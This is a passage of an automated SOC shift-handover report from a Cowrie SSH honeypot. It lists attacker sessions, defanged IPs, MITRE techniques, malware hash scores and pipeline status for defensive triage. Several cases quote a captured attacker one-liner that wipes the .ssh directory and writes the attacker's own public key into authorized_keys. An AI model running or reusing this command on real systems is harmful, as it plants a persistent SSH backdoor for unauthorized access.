| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:43:48` | `cowrie.session.connect` |
| `2026-06-03 23:43:48` | `cowrie.client.version` |
| `2026-06-03 23:43:48` | `cowrie.client.kex` |
| `2026-06-03 23:43:48` | `cowrie.login.success` |
| `2026-06-03 23:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.213.160[.]153` to AbuseIPDB if not already reported
- [ ] Block `4.213.160[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67989701248a

| Field | Detail |
|---|---|
| **Source IP** | `200.105.172[.]184` |
| **First Seen** | 2026-06-03 23:44 |
| **Last Seen** | 2026-06-03 23:44 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:44:20` | `cowrie.session.connect` |
| `2026-06-03 23:44:20` | `cowrie.client.version` |
| `2026-06-03 23:44:21` | `cowrie.client.kex` |
| `2026-06-03 23:44:22` | `cowrie.login.success` |
| `2026-06-03 23:44:23` | `cowrie.session.params` |
| `2026-06-03 23:44:23` | `cowrie.command.input` |
| `2026-06-03 23:44:23` | `cowrie.command.failed` |
| `2026-06-03 23:44:24` | `cowrie.log.closed` |
| `2026-06-03 23:44:24` | `cowrie.session.params` |
| `2026-06-03 23:44:24` | `cowrie.command.input` |
| `2026-06-03 23:44:24` | `cowrie.session.file_download` |
| `2026-06-03 23:44:24` | `cowrie.log.closed` |
| `2026-06-03 23:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.172[.]184` to AbuseIPDB if not already reported
- [ ] Block `200.105.172[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86e101764c5e

| Field | Detail |
|---|---|
| **Source IP** | `200.105.172[.]184` |
| **First Seen** | 2026-06-03 23:44 |
| **Last Seen** | 2026-06-03 23:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:44:28` | `cowrie.session.connect` |
| `2026-06-03 23:44:28` | `cowrie.client.version` |
| `2026-06-03 23:44:28` | `cowrie.client.kex` |
| `2026-06-03 23:44:30` | `cowrie.login.success` |
| `2026-06-03 23:44:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.172[.]184` to AbuseIPDB if not already reported
- [ ] Block `200.105.172[.]184` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d29853680ee4

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-03 23:45 |
| **Last Seen** | 2026-06-03 23:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:45:01` | `cowrie.session.connect` |
| `2026-06-03 23:45:01` | `cowrie.client.version` |
| `2026-06-03 23:45:01` | `cowrie.client.kex` |
| `2026-06-03 23:45:02` | `cowrie.login.success` |
| `2026-06-03 23:45:03` | `cowrie.session.params` |
| `2026-06-03 23:45:03` | `cowrie.command.input` |
| `2026-06-03 23:45:03` | `cowrie.command.failed` |
| `2026-06-03 23:45:03` | `cowrie.log.closed` |
| `2026-06-03 23:45:03` | `cowrie.session.params` |
| `2026-06-03 23:45:03` | `cowrie.command.input` |
| `2026-06-03 23:45:04` | `cowrie.session.file_download` |
| `2026-06-03 23:45:04` | `cowrie.log.closed` |
| `2026-06-03 23:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537bd63e0a40

| Field | Detail |
|---|---|
| **Source IP** | `103.20.223[.]56` |
| **First Seen** | 2026-06-03 23:45 |
| **Last Seen** | 2026-06-03 23:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:45:06` | `cowrie.session.connect` |
| `2026-06-03 23:45:06` | `cowrie.client.version` |
| `2026-06-03 23:45:06` | `cowrie.client.kex` |
| `2026-06-03 23:45:07` | `cowrie.login.success` |
| `2026-06-03 23:45:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.20.223[.]56` to AbuseIPDB if not already reported
- [ ] Block `103.20.223[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6debc27cc58a

| Field | Detail |
|---|---|
| **Source IP** | `4.213.160[.]153` |
| **First Seen** | 2026-06-03 23:45 |
| **Last Seen** | 2026-06-03 23:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:45:50` | `cowrie.session.connect` |
| `2026-06-03 23:45:50` | `cowrie.client.version` |
| `2026-06-03 23:45:50` | `cowrie.client.kex` |
| `2026-06-03 23:45:50` | `cowrie.login.success` |
| `2026-06-03 23:45:50` | `cowrie.session.params` |
| `2026-06-03 23:45:50` | `cowrie.command.input` |
| `2026-06-03 23:45:50` | `cowrie.command.failed` |
| `2026-06-03 23:45:50` | `cowrie.log.closed` |
| `2026-06-03 23:45:50` | `cowrie.session.params` |
| `2026-06-03 23:45:50` | `cowrie.command.input` |
| `2026-06-03 23:45:50` | `cowrie.session.file_download` |
| `2026-06-03 23:45:50` | `cowrie.log.closed` |
| `2026-06-03 23:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.213.160[.]153` to AbuseIPDB if not already reported
- [ ] Block `4.213.160[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0a40873531b

| Field | Detail |
|---|---|
| **Source IP** | `4.213.160[.]153` |
| **First Seen** | 2026-06-03 23:45 |
| **Last Seen** | 2026-06-03 23:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-03 23:45:51` | `cowrie.session.connect` |
| `2026-06-03 23:45:51` | `cowrie.client.version` |
| `2026-06-03 23:45:51` | `cowrie.client.kex` |
| `2026-06-03 23:45:51` | `cowrie.login.success` |
| `2026-06-03 23:45:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `4.213.160[.]153` to AbuseIPDB if not already reported
- [ ] Block `4.213.160[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `221.207.54[.]125` | **36** | 2026-06-03 22:28 | 2026-06-03 23:03 | 25m | 23 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.107[.]214` | **31** | 2026-06-03 23:27 | 2026-06-03 23:45 | 52m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `200.105.167[.]197` | **20** | 2026-06-03 21:32 | 2026-06-03 22:15 | 1m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.95.194[.]52` | **20** | 2026-06-03 21:22 | 2026-06-03 22:08 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `150.221.241[.]30` | **8** | 2026-06-03 21:24 | 2026-06-03 21:36 | 16m | 0 | `T1592` | 🟢 LOW |
| `103.20.223[.]56` | **7** | 2026-06-03 23:23 | 2026-06-03 23:45 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `4.213.160[.]153` | **7** | 2026-06-03 23:30 | 2026-06-03 23:45 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `45.66.156[.]214` | **7** | 2026-06-03 22:18 | 2026-06-03 23:46 | 1m | 0 | `T1592` | 🟢 LOW |
| `45.78.207[.]244` | **7** | 2026-06-03 22:40 | 2026-06-03 23:04 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `200.105.172[.]184` | **5** | 2026-06-03 23:37 | 2026-06-03 23:46 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `58.152.42[.]174` | **5** | 2026-06-03 21:26 | 2026-06-03 22:37 | 0m | 5 | `T1110.001 · T1592` | 🟢 LOW |
| `62.171.187[.]140` | **3** | 2026-06-03 23:33 | 2026-06-03 23:40 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `113.250.184[.]183` | **2** | 2026-06-03 22:24 | 2026-06-03 23:03 | 3m | 0 | `T1592` | 🟢 LOW |
| `169.239.182[.]216` | **2** | 2026-06-03 23:42 | 2026-06-03 23:46 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.184.76[.]26` | **2** | 2026-06-03 22:35 | 2026-06-03 22:35 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `20.118.209[.]32` | **2** | 2026-06-03 21:29 | 2026-06-03 21:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.251.125[.]118` | **2** | 2026-06-03 23:18 | 2026-06-03 23:18 | 0m | 0 | `T1592` | 🟢 LOW |
| `108.34.48[.]194` | 1 | 2026-06-03 22:46 | 2026-06-03 22:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `121.229.191[.]90` | 1 | 2026-06-03 21:21 | 2026-06-03 21:21 | 12s | 0 | `T1592` | 🟢 LOW |
| `14.103.114[.]234` | 1 | 2026-06-03 22:58 | 2026-06-03 23:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.22.82[.]116` | 1 | 2026-06-03 23:21 | 2026-06-03 23:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `163.7.9[.]55` | 1 | 2026-06-03 22:33 | 2026-06-03 22:33 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.184.178[.]165` | 1 | 2026-06-03 22:33 | 2026-06-03 22:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]30` | 1 | 2026-06-03 22:35 | 2026-06-03 22:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]31` | 1 | 2026-06-03 22:35 | 2026-06-03 22:35 | 10s | 0 | `T1592` | 🟢 LOW |
| `220.250.52[.]94` | 1 | 2026-06-03 23:42 | 2026-06-03 23:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.73.38[.]18` | 1 | 2026-06-03 23:40 | 2026-06-03 23:40 | 13s | 0 | `T1592` | 🟢 LOW |
| `40.76.117[.]232` | 1 | 2026-06-03 23:46 | 2026-06-03 23:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.202.240[.]36` | 1 | 2026-06-03 23:26 | 2026-06-03 23:26 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.154.2[.]217` | 1 | 2026-06-03 21:26 | 2026-06-03 21:28 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 39/100 | 🟢 LOW | **23/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.202.240[.]36` | US | Akile LTD | **100** ⚠️ | 2 |
| `200.105.167[.]197` | BO | AXS Bolivia S. A. | **100** ⚠️ | 3 |
| `40.76.117[.]232` | US | Microsoft Corporation | **100** ⚠️ | 0 |
| `20.118.209[.]32` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `169.239.182[.]216` | ZA | VPS Hostafrica | **100** ⚠️ | 1 |
| `8.154.2[.]217` | CN | Aliyun Computing Co.LTD | **100** ⚠️ | 12 |
| `113.250.184[.]183` | CN | CHINANET Chongqing Province Network | **100** ⚠️ | 17 |
| `58.152.42[.]174` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 9 |
| `45.78.207[.]244` | SG | BYTEPLUS | **100** ⚠️ | 50 |
| `47.251.125[.]118` | US | Alibaba Cloud - US | **100** ⚠️ | 24 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 149 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 104 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 31 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 16 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 16 |

---

## 🔕 False Positive Summary (6 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 3 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 2 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 216 cases |
| Tool 34  | Credential Extractor        | ✅ 136 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 36 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 6 filtered (2.8%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 24 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 31 priority case(s) shown individually · 30 recon entry/entries in table (17 group(s) consolidating 166 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-03T23:48:11Z_
